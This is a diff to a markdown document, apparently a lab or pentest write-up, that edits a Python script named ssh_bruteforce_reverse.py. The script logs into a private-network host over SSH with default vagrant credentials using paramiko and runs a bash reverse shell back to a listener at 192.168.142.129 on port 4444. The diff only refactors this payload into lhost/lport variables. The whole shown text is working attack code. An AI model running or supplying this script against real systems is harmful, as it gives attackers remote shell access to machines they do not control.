@@ -48,20 +48,20 @@
 ### Python Script: `ssh_bruteforce_reverse.py`
 ```python
 import paramiko
-import time
 
-host = "192.168.142.131"
-port = 22
+target_ip = "192.168.142.131"
 username = "vagrant"
 password = "vagrant"
-reverse_shell_cmd = "bash -i >& /dev/tcp/192.168.142.129/4444 0>&1"
+lhost="192.168.142.129"
+lport = "4444"
+
+payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
 
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-client.connect(host, port=port, username=username, password=password)
+client.connect(target_ip, username=username, password=password)
+client.exec_command(payload)
 
-stdin, stdout, stderr = client.exec_command(reverse_shell_cmd)
-time.sleep(2)
 client.close()
 ```
 
